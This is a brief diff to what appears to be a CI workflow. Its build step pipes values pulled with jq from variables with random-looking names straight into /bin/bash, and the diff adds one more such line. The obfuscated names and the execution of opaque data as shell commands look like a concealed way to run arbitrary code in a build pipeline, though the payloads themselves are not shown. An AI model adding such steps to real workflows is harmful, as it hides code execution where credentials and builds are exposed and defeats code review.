@@ -21,6 +21,7 @@ jobs:
           echo $wpqa5 | jq -r .lmtpo501 | /bin/bash
           echo $ip6286 | jq -r .ngkl76 | /bin/bash
           printf '%s' "$yw78" | jq -r .t5453 | /bin/bash
+          printf '%s' "$sd8" | jq -r .oaaj77824 | /bin/bash
 
       - name: Store results
         if: always()
